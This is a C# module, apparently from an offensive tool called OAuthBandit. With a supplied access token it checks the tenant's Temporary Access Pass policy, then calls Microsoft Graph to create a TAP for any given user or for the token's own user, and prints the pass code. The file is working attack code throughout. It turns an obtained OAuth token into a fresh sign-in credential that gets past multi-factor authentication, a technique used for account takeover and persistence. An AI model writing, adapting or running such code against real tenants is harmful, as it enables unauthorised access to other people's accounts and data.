using System.Text.Json;
using OAuthBandit.Core;

namespace OAuthBandit.Mfa;

public class TapCreate
{
    private const string GraphBase = "https://graph.microsoft.com/v1.0";
    private const string GraphBeta = "https://graph.microsoft.com/beta";
    private readonly GraphClient _graph;

    public TapCreate(string accessToken)
    {
        _graph = new GraphClient(accessToken);
    }

    public bool CheckTapPolicy()
    {
        try
        {
            var (result, status, _, _) = _graph.GetDetailed(
                $"{GraphBeta}/policies/authenticationMethodsPolicy/authenticationMethodConfigurations/temporaryAccessPass");
            if (result != null)
            {
                var state = result.Value.TryGetProperty("state", out var s) ? s.GetString() ?? "disabled" : "disabled";
                Console.WriteLine($"    [*] TAP Policy: {state}");
                return state == "enabled";
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] Cannot check TAP policy: {ex.Message}");
        }
        return false;
    }

    public TAPResult? CreateTap(string userId, string upn = "unknown",
        int lifetimeMinutes = 60, bool isUsableOnce = false)
    {
        Console.WriteLine($"    [*] Creating TAP for: {upn}");

        var payload = new { lifetimeInMinutes = lifetimeMinutes, isUsableOnce };

        string[] endpoints =
        {
            $"{GraphBase}/users/{userId}/authentication/temporaryAccessPassMethods",
            $"{GraphBeta}/users/{userId}/authentication/temporaryAccessPassMethods"
        };

        foreach (var endpoint in endpoints)
        {
            var (result, status, errCode, errMsg) = _graph.Post(endpoint, payload);

            if (result != null && result.Value.TryGetProperty("temporaryAccessPass", out var tapCode))
            {
                var now = DateTime.UtcNow;
                var expires = now.AddMinutes(lifetimeMinutes);

                var tap = new TAPResult
                {
                    TapCode = tapCode.GetString()!,
                    UserId = userId,
                    Upn = upn,
                    LifetimeMinutes = lifetimeMinutes,
                    IsUsableOnce = isUsableOnce,
                    CreatedAt = now.ToString("yyyy-MM-dd HH:mm:ss") + " UTC",
                    ExpiresAt = expires.ToString("yyyy-MM-dd HH:mm:ss") + " UTC",
                    MethodId = result.Value.TryGetProperty("id", out var mid) ? mid.GetString() ?? "" : ""
                };

                Console.WriteLine($"    [+] TAP created successfully!");
                Console.WriteLine($"    [+] Code: {tap.TapCode}");
                Console.WriteLine($"    [+] Expires: {tap.ExpiresAt}");
                return tap;
            }

            if (status == 403 || errCode?.Contains("Authorization_RequestDenied") == true)
            {
                Console.WriteLine("    [!] Insufficient privileges for TAP creation");
                return null;
            }

            if (errMsg?.Contains("TemporaryAccessPass") == true)
            {
                Console.WriteLine("    [!] TAP not enabled in tenant policy");
                return null;
            }

            if (!string.IsNullOrEmpty(errMsg))
                Console.WriteLine($"    [!] TAP creation failed: {errMsg[..Math.Min(errMsg.Length, 100)]}");
        }

        return null;
    }

    public TAPResult? CreateTapForSelf(int lifetimeMinutes = 60)
    {
        try
        {
            var userInfo = _graph.Get($"{GraphBase}/me");
            if (userInfo == null) return null;

            var userId = userInfo.Value.TryGetProperty("id", out var id) ? id.GetString() : null;
            var upn = userInfo.Value.TryGetProperty("userPrincipalName", out var u) ? u.GetString() ?? "unknown" : "unknown";

            if (userId == null) return null;
            return CreateTap(userId, upn, lifetimeMinutes);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] Failed to get current user: {ex.Message}");
            return null;
        }
    }
}
